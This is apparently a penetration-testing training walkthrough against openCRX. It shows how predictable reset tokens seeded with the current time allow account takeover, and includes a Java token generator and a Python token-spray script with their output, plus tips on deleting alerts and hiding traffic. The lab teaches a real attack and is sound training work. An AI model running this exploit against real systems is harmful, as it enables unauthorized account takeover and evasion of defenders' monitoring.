#### openCRX Authentication Bypass and Remote Code Execution

We will use white box techniques to exploit deterministic password reset tokens to gain access to the application. Once authenticated, we will combine two different exploits to gain remote code execution and create a web shell on the server.

(openCRX, 2020), http://www.opencrx.org/ ↩︎

Starting server

```
ssh student@opencrx
cd crx/apache-tomee-plus-7.0.5/bin
./opencrx.sh run
```
##### Password Reset Vulnerability Discovery

 We will ssh to the server and inspect the application's structure on the server using the tree command, limiting the depth to three sub-directories with -L 3.

```
ssh student@opencrx
cd crx/apache-tomee-plus-7.0.5/
tree -L 3
```

Based on the output above, we know that openCRX was packaged as an EAR file, which we can find at /home/student/crx/apache-tomee-plus-7.0.5/apps.

There are also several WAR files inside /home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX. These files should also be inside the EAR file, eliminating the need to copy each individually to our box for analysis.
use scp to copy opencrx-core-CRX.ear to our local Kali machine. Next, we'll unzip it, passing in -d opencrx to extract the contents into a new directory.

```
exit
scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
unzip -q opencrx-core-CRX.ear -d opencrx

cd opencrx
ls -al

```

We could examine a Java web application by starting with its deployment descriptor,5 such as a web.xml file, to better understand how the application maps URLs to servlets. However, we'll instead start with JSP6 files. We're taking this approach because openCRX mixes application logic with HTML within the JSPs.

In Java web applications, "servlet" is a shorthand for the classes that handle requests, such as HTTP requests. Each framework has its own versions of servlets; in general, they implement code that takes in a request and returns a response. Java Server Pages (JSP) are a form of servlet used for dynamic pages. JSPs can mix Java code with traditional HTML.

Exploring the contents of the WAR file in JD-GUI, we find several JSP files which mention authentication and password resets.


Since vulnerabilities in authentication and password reset functions can often be leveraged to gain authenticated access to a web application, we'll inspect these functions first. If we can find and exploit a vulnerability that gives us access to a valid user account, we can then search for other post-authentication vulnerabilities. With that in mind, let's explore the source code for RequestPasswordReset.jsp to discover how this application handles password resets.

056  %><%@ page session="true" import="
057  java.util.*,
058  java.net.*,
059  java.util.Enumeration,
060  java.io.PrintWriter,
061  org.w3c.spi2.*,
062  org.openmdx.portal.servlet.*,
063  org.openmdx.base.naming.*,
064  org.opencrx.kernel.generic.*
Listing 5 - Code excerpt from RequestPasswordReset.jsp

Several custom libraries are imported starting on line 56. The import attribute specifies which classes can be used within the JSP. This is similar to an import statement in a standard Java source file which adds application logic to the program. The org.opencrx.kernel.generic.* import on line 64 is especially interesting as the naming pattern fits the application we are examining. The "*" character in the import is a wildcard used to import all classes within the package.

The file also contains additional application logic. The application code that handles password resets starts near the end of the file, around line 153.

153		if(principalName != null && providerName != null && segmentName != null) {
154			javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
155			javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
156				SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName, 
157				null
158			);
159			try {
160				org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
161					new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", principalName)
162				);
163				pm.currentTransaction().begin();
164				userHome.requestPasswordReset();
165				pm.currentTransaction().commit();
166				success = true;
167			} catch(Exception e) {
168				try {
169					pm.currentTransaction().rollback();
170				} catch(Exception ignore) {}
171				success = false;
172			}
173		} else {
174			success = false;
175		}
Listing 6 - Code excerpt from RequestPasswordReset.jsp

Let's step through the logic in this code block. In order to execute it, the if statement on line 153 needs to evaluate to true, which means principalName, providerName, and segmentName cannot be null. On lines 160 and 161, the pm.getObjectById method call uses those values to get an org.opencrx.kernel.home1.jmi1.UserHome object.

Line 164 calls a requestPasswordReset method on this object. We will need to find where this class is defined to continue tracing the password reset logic. If the class definition for UserHome was inside the WAR file we opened, we would be able to click on the linked method name in JD-GUI. Since there is no clickable link, we know the class must be defined elsewhere.

While we have been examining a WAR file, the overall application was deployed as an EAR file. EAR files include an application.xml file that contains deployment information, which includes the location of external libraries. Let's check this file, which we can find in the META-INF directory.

kali@kali:~/opencrx$ cat META-INF/application.xml
<?xml version="1.0" encoding="UTF-8"?>
<application id="opencrx-core-CRX-App" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="5" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/application_5.xsd">
	<display-name>openCRX EAR</display-name>
	<module id="opencrx-core-CRX">
		<web>
			<web-uri>opencrx-core-CRX.war</web-uri>
			<context-root>opencrx-core-CRX</context-root>
		</web>
	</module>
...
	<library-directory>APP-INF/lib</library-directory>
</application>
Listing 7 - openCRX's application.xml file

The library-directory element specifies where external libraries are found within an EAR file. The opencrx-kernel.jar file is located in the extracted /APP-INF/lib directory. We should be able to find the UserHome class inside that JAR file based on naming conventions.

While we do find the class there, it is just an interface.7 Interfaces define a list of methods (sometimes referred to as behaviors) but do not implement the actual code within those methods. Instead, classes can implement one or more interfaces. If a class implements an interface, it must include code for all the methods defined in that interface.

To determine what the method call actually does, we will need to find a class that implements the interface. Let's search for "requestPasswordReset" in JD-GUI to find other classes that might contain or call this method, making sure "Method" is checked when we perform our search.

When we search the entire code base of opencrx-kernel.jar, we find five results for "requestPasswordReset". If the name of a class is appended with "Impl", it implements an interface. If we inspect org.opencrx.kernel.home1.aop2.UserHomeImpl.class, we will find a short method that calls the requestPasswordReset method of org.opencrx.kernel.backend.UserHomes.class.

111  public Void requestPasswordReset() {
112    try {
113      UserHomes.getInstance().requestPasswordReset((UserHome)
114        sameObject());
115      
116      return newVoid();
117    } catch (ServiceException e) {
118      throw new JmiServiceException(e);
119    } 
120  }
Listing 8 - Code excerpt from UserHomeImpl.class

Let's inspect the requestPasswordReset function in that UserHomes class by clicking on requestPasswordReset within the try/catch block.

324 public void requestPasswordReset(UserHome userHome) throws ServiceException {
...   
336     String webAccessUrl = userHome.getWebAccessUrl();
337     if (webAccessUrl != null) {
338       String resetToken = Utils.getRandomBase62(40);
...       
341       String name = providerName + "/" + segmentName + " Password Reset";
342       String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
343       String resetCancelUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetCancel.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
...     
363       changePassword((Password)loginPrincipal
364           .getCredential(), null, "{RESET}" + resetToken);
365     } 
366   }
Listing 9 - Code excerpt from org.opencrx.kernel.backend.UserHomes.java

The application makes a method call on line 338 to generate a token. The token is used in some strings like "resetConfirmUrl", and ultimately passed to the changePassword method on line 364. To understand how that token is generated in Utils, we can open the source code by clicking on "getRandomBase62".

1038   public static String getRandomBase62(int length) {
1039      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
1040     Random random = new Random(System.currentTimeMillis());
1041     String s = "";
1042     for (int i = 0; i < length; i++) {
1043       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
1044     }
1045     return s;
1046   }
Listing 10 - Code excerpt from org.opencrx.kernel.utils.Util.java

The getRandomBase62 method accepts an integer value and returns a randomly generated string of that length. There's something wrong with this code however. Let's investigate further.

1
(The Apache Software Foundation, 2016), https://tomee.apache.org/ ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/JAR_(file_format) ↩︎

3
(Wikipedia, 2020), https://en.wikipedia.org/wiki/WAR_(file_format) ↩︎

4
(Wikipedia, 2020), https://en.wikipedia.org/wiki/EAR_(file_format) ↩︎

5
(Wikipedia, 2019), https://en.wikipedia.org/wiki/Deployment_descriptor ↩︎

6
(Wikipedia, 2020), https://en.wikipedia.org/wiki/JavaServer_Pages ↩︎

7
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Interface_(Java) ↩︎


#### When Random Isn't
We will use javac1 and jshell2 in this section. If not already installed, let's install them with sudo apt install openjdk-11-jdk-headless. We want to match the version of the JDK with the JRE we have installed in Kali, which we can confirm using java -version.

We can use jshell to interactively run Java and observe this behavior in action. Let's import the Random class, then declare and instantiate two instances of Random objects with the same seed value. Then, we can compare the output of calling the nextInt5 method on each Random object inside a for loop.

kali@kali:~$ jshell
|  Welcome to JShell -- Version 11.0.6
|  For an introduction type: /help intro

jshell> import java.util.Random;

jshell> Random r1 = new Random(42);
r1 ==> java.util.Random@26a1ab54

jshell> Random r2 = new Random(42);
r2 ==> java.util.Random@41cf53f9

jshell> int x, y;
x ==> 0
y ==> 0

jshell> for(int i=0; i<10; i++) { x = r1.nextInt(); y = r2.nextInt(); if(x == y){ System.out.println("They match! " + x);}}
They match! -1170105035
They match! 234785527
They match! -1360544799
They match! 205897768
They match! 1325939940
They match! -248792245
They match! 1190043011
They match! -1255373459
They match! -1436456258
They match! 392236186
Listing 11 - Generating two random integers and comparing them in a for loop

Let's observe this in action, again using jshell. SecureRandom objects use a byte array as a seed, so we'll need to declare a byte array before we instantiate our objects.

jshell> import java.security.SecureRandom;

jshell> byte[] s = new byte[] { (byte) 0x2a }
s ==> byte[1] { 42 }

jshell> SecureRandom r1 = new SecureRandom(s);
r1 ==> NativePRNG

jshell> SecureRandom r2 = new SecureRandom(s);
r2 ==> NativePRNG

jshell> if(r1.nextInt() == r2.nextInt()) { System.out.println("They match!"); } else { System.out.println("No match."); }
No match.

jshell> /exit
|  Goodbye
Listing 12 - Comparing the output of two SecureRandom objects

Even though they were instantiated with the same seed value, the two SecureRandom objects returned different results from the nextInt method.

What does this mean for us? Let's review the token generation code to remember what we are working with.

1038   public static String getRandomBase62(int length) {
1039      String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
1040     Random random = new Random(System.currentTimeMillis());
1041     String s = "";
1042     for (int i = 0; i < length; i++) {
1043       s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
1044     }
1045     return s;
1046   }
Listing 13 - Code excerpt from org.opencrx.kernel.utils.Util.java

The code in openCRX uses the regular Random class to generate password reset tokens; it is seeded with the results of System.currentTimeMillis(). This method returns "the difference, measured in milliseconds, between the current time and midnight, January 1, 1970 UTC".6

If we can predict when a token is requested, we should be able to generate a matching token by manipulating the seed value when creating our own Random object. We could even generate a list of possible tokens, assuming there is no throttling or lockout for password resets on the server, and iterate through the list until we find a match. However, we also need an account to target.

Exercises
Use jshell to recreate the code blocks in this section.
Compare ten outputs from SecureRandom objects using a for loop.
1
(Oracle, 2018), https://docs.oracle.com/javase/7/docs/technotes/tools/windows/javac.html ↩︎

2
(Oracle, 2017), https://docs.oracle.com/javase/9/jshell/introduction-jshell.htm#JSHEL-GUID-630F27C8-1195-4989-9F6B-2C51D46F52C8 ↩︎

3
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/util/Random.html ↩︎

4
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/security/SecureRandom.html ↩︎

5
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/util/Random.html#nextInt-- ↩︎

6
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/lang/System.html#currentTimeMillis-- ↩︎

#### Account Determination

A default installation1 of openCRX has three accounts with the following username and password pairs:

guest / guest
admin-Standard / admin-Standard
admin-Root / admin-Root
With this in mind, let's start Burp Suite and configure Firefox to use it as a proxy.

We can use error messages from login and password reset pages to determine the validity of a submitted username. We can find the reset page by going to the login page in Listing 14 and submitting invalid credentials. This reveals the link to the password reset page.

http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet?loginFailed=false
Listing 14 - Login page URI

Let's submit a password reset for a default username to determine if if this page discloses valid user accounts. If we submit a valid account, the response indicates the password reset request was successful.

If we submit an invalid account, we receive an error message.

The differences in the response indicate the existence of a "guest" account. Let's use "guest" as our target account for the reset process.

1
(openCRX, 2020), https://github.com/opencrx/opencrx-documentation/blob/master/Admin/InstallerServer.md ↩︎

##### Timing the Reset Request

In order to generate the correct password reset token, we need to guess the seed value, which is the exact millisecond that the token was generated. Thankfully, the value returned by System.currentTimeMillis() is already in UTC, so we don't have to worry about time zone differences.

We can get the milliseconds "since the epoch" using the date command in Kali with the %s flag. We'll also use the %3N flag to include three digits of nanoseconds. This format will match the output of the Java method in milliseconds.

We can get the range of potential seed values using the date command before and after we submit the reset request with curl. We will also use the -i flag to include response headers in the output. In order for this attack to succeed, the server time must be set to the correct date and time. We can use the Date1 response header to determine the server time.

kali@kali:~$ date +%s%3N && curl -s -i -X 'POST' --data-binary 'id=guest' 'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && date +%s%3N
1582038122371
HTTP/1.1 200 
Set-Cookie: JSESSIONID=367FD5747FB803124A0F504A1FC478B7; Path=/opencrx-core-CRX; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 2282
Date: Tue, 18 Feb 2020 15:02:02 GMT
Server: Apache TomEE
...
1582038122769
Listing 15 - Submitting a password reset request with curl


Based on the output, we can guess that the reset token was created with a seed value between 1582038122371 and 1582038122769. This includes 398 possible seed values.

This range varies based on network latency and server processing time. However, the seed is determined early in the password reset process, so it is likely to be closer to the start time rather than the end time.

The server response included a Date header with the value of "Tue, 18 Feb 2020 15:02:02 GMT". We can convert this value to the Unix epoch time using a site such as EpochConverter.2

Figure 7: Converting the Date header to milliseconds since the epoch
Figure 7: Converting the Date header to milliseconds since the epoch
We do not get the same level of millisecond precision from the value of the Date header as we do from running the date command. The timestamp will always end in 000. However, we can use the header value as a sanity check to make sure our local values are in the correct range.

In this case, the timestamps we calculated locally, 1582038122371 and 1582038122769, do roughly align with the value from the server (1582038122000). The values should be close enough to proceed with this attack.

1
(Internet Engineering Task Force, 2014), https://tools.ietf.org/html/rfc7231#section-7.1.1.2 ↩︎

2
(Epoch Converter, 2020), https://www.epochconverter.com ↩︎

##### Generate Token List
Now that we have the range of potential random seeds, we need to create our own token generator. Let's create a file with our own Java class to generate the tokens to exploit the predictable random generation. The name of the class within the file must match the file name and end with "java" as the file extension. We will use touch to create an empty file named OpenCRXToken.java.

kali@kali:~/opencrx$ touch OpenCRXToken.java
Listing 16 - Creating an empty Java source file

Next, let's start by building out the basic outline of our class. We will need a class definition, a main method so that we can run the class from the command line, and a method that generates the tokens. We'll copy much of the code that generates the tokens from org.opencrx.kernel.utils.Util.java, but we'll modify it to accept the seed value so we can iterate through values as we generate tokens. We'll also import java.util.Random to generate the tokens. A simple text editor like nano should suffice for editing the file.

kali@kali:~/opencrx$ nano OpenCRXToken.java

import java.util.Random;

public class OpenCRXToken {
  
  public static void main(String args[]) { }
  
  public static String getRandomBase62(int length, long seed) { }
}

Listing 17 - Updating the Java source file

Let's build out the main method next. We will need an int variable for the length of the token, long variables for the start and stop seed values, and a String for the token values. We will use a for loop to iterate between the start and stop values, calling the getRandomBase62 method and passing in the seed value as it iterates.

import java.util.Random;
  
public class OpenCRXToken {
  
  public static void main(String args[]) {
    int length = 40;
    long start = Long.parseLong("1582038122371");
    long stop = Long.parseLong("1582038122769");
    String token = "";
  
    for (long l = start; l < stop; l++) {
      token = getRandomBase62(length, l);
      System.out.println(token);
    }
  }
  
  public static String getRandomBase62(int length, long seed) {
  
  }
}
Listing 18 - OpenCRXToken.java

We will set the start and stop values which are based on the timestamps from when we ran curl in Listing 15. Finally, we will copy the contents of the getRandomBase62 method from org.opencrx.kernel.utils.Util.java and modify it to use the seed value passed in to the method. Please note that for the sake of brevity, the function content is not included in the listing above.

Once the values are set, we can compile the program with javac and run it with java, redirecting the output into a text file. We will also tail the file to make sure the tokens were written correctly.

kali@kali:~/opencrx$ javac OpenCRXToken.java 

kali@kali:~/opencrx$ java OpenCRXToken > tokens.txt

kali@kali:~/opencrx$ tail tokens.txt
SCKF9pp15wUrAZj84eC7m3Z1P5PexTb9wUetcF4T
OA1Otn7zkpspZ7pa3kIxSFsKcRdRelTKaQhmPkf3
aAycQmACHCk1cSdI4YKwnf8m464bmo2xjRtWldPY
1C8wnnzbg47SPVBE55G1mMNOi5k8NeK3KSHEhwEz
DA5AKo2oCR1dTp0u3uH07obqAkBIVhugTRTz3ryV
88mJ3mJmtLNZpN5M5zOqmzu9N7P5Axls7NXrqJZ5
K8iXdlOxPjGlvhu45nPp6QAdplpEK2LVEMieCEIb
l8srznDOnZdCgkSy4MLv67PEWlWkvqdbrP7J7X84
x8p5WnGZLwVOm4Hg4BMuRXdgySxv3vCE0OJ4UQqZ
vMSsitoJwnrHnfB00BneUoeGxMxiQPj3UjkCnBNi
Listing 19 - Compiling and running OpenCRXToken

With our token list generated, we'll next determine how to leverage it to complete the password reset process.

##### 
Automating Resets
When we examined the source code in UserHomes.class, we found the format of a reset link:

 String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
Listing 20 - Password reset link

We have our tokens, but we will also need to provide values for providerName, segmentName, and id. Based on the password reset request we sent, we know the id value is the username. We can find clues for providerName and segmentName in the source code of RequestPasswordReset.jsp.

234  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="RequestPasswordReset.jsp" accept-charset="UTF-8">
235      <h2 class="form-signin-heading">Please enter your username, e-mail address or ID</h2>					
236      <input type="text" name="id" id="id" autofocus="" placeholder="ID (e.g. guest@CRX/Standard)" class="form-control" />
237      <br />
238      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
239      <br />
240      <%@ include file="request-password-reset-note.html" %>
241  </form>
Listing 21 - An example of provider and segment in RequestPasswordReset.jsp

Line 236 defines the input field for id, which includes a placeholder value of "guest@CRX/Standard". When we visit that page in our browser, we receive a different placeholder.

The value "CRX" has been replaced with "ProviderName" and "Standard" has been replaced with "SegmentName". We can find another example that matches this pattern by examining WizardInvoker.jsp in JD-GUI.

65	/**
66	 *	The WizardInvoker is invoked with the following URL parameters:
67	 *	- wizard: path of the wizard JSP
68	 *	- provider: provider name
69	 *	- segment: segment name
70	 *	- xri: target object xri
71	 *	- user: user name
72	 *	- password: password
73	 *  - para_0, para_1, ... para_n: additional parameters to be passed to the wizard (optional)
74	 *	Example:
75	 *	http://localhost:8080/opencrx-core-CRX/WizardInvoker.jsp?wizard=/wizards/en_US/UploadMedia.jsp&provider=CRX&segment=Standard&xri=xri://@openmdx*org.opencrx.kernel.home1/provider/CRX/segment/Standard&user=wfro&password=.
Listing 22 - An example of provider and segment in WizardInvoker.jsp

On lines 68 and 69, we find references to providers and segments. We can also find an example URL on line 75 that uses "CRX" as the provider and "Standard" as the segment. This matches the same pattern we found in RequestPasswordReset.jsp. We will try using "CRX" as the providerName and "Standard" as the segmentName in our attack.

Now that we know what all of the values are, let's examine the source code of PasswordResetConfirm.jsp to determine what data we need to send to the server for the reset.

067  String resetToken = request.getParameter("t");
068  String providerName = request.getParameter("p");
069  String segmentName = request.getParameter("s");
070  String id = request.getParameter("id");
071  String password1 = request.getParameter("password1");
072  String password2 = request.getParameter("password2");
...
163  <form role="form" class="form-signin" style="max-width:400px;margin:0 auto;" method="POST" action="PasswordResetConfirm.jsp" accept-charset="UTF-8">
164      <h2 class="form-signin-heading">Reset password for <%= id %>@<%= providerName + "/" + segmentName %></h2>					
165      <input type="hidden" name="t" value="<%= resetToken %>" />
166      <input type="hidden" name="p" value="<%= providerName %>" />
167      <input type="hidden" name="s" value="<%= segmentName %>" />
168      <input type="hidden" name="id" value="<%= id %>" />
169      <input type="password" name="password1" autofocus="" placeholder="Password" class="form-control" />
170      <input type="password" name="password2" placeholder="Password (verify)" class="form-control" />
171      <br />
172      <button type="submit" class="btn btn-lg btn-primary btn-block">OK</button>
173      <br />
174      <%@ include file="password-reset-confirm-note.html" %>					
175  </form>
Listing 23 - Code excerpt from PasswordResetConfirm.jsp

Lines 163 - 175 are the form element we want to mimic in our reset script. In addition to the token, providerName, segmentName, and id, we need to provide a new password value in the password1 and password2 fields.

We now have everything we need to write a Python script to automate the password reset process. We will iterate through the list of tokens we previously generated with our OpenCRXToken Java class and POST each token to the server. Let's inspect the server responses to see if the reset worked and exit the for loop once we have a successful reset.

#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
Listing 24 - OpenCRXReset.py

Let's run the script. It may take a few minutes to return a result.

kali@kali:~/Documents/research$ ./OpenCRXReset.py -u guest -p password
Starting token spray. Standby.
Successful reset with token: yzs4pCxiRTym9Srs6OrzUY0b9HtEnDK8SrPtjBUe
Listing 25 - Running the reset script

We can verify the password reset was successful by attempting to log in to the site in our browser with the username "guest" and password "password".

Figure 9: Logged in as guest
Figure 9: Logged in as guest
We have now successfully reset the password for the guest account and have access to the application. A few alerts were created for the password resets we requested. Although not required for this exercise, deleting these alerts would help maintain stealth during a penetration test.

Sending up to 3000 requests to the web application is noisy. In a real world scenario, we would likely want to rate limit our script to hide our tracks in normal traffic and avoid overloading the server.



